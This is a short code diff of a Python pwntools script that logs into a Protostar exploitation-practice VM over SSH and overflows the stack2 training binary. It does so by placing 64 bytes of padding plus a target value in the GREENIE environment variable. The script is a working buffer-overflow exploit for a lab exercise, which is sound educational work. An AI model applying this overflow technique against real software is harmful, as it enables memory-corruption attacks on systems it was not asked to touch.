@@ -6,8 +6,9 @@ shell = ssh('user', ip, password='user')
 sh = shell.run("sh")
 sh.sendline("cd /opt/protostar/bin/")
 
-exploit = "A"*500
+exploit = "A"*64 + "\x0a\x0d\x0a\x0d"
 
-sh.sendline("./stack3")
-sh.sendline(exploit)
+sh.sendline("export GREENIE=\"%s\"" % exploit)
+sh.sendline("./stack2")
+
 print(sh.recvline())
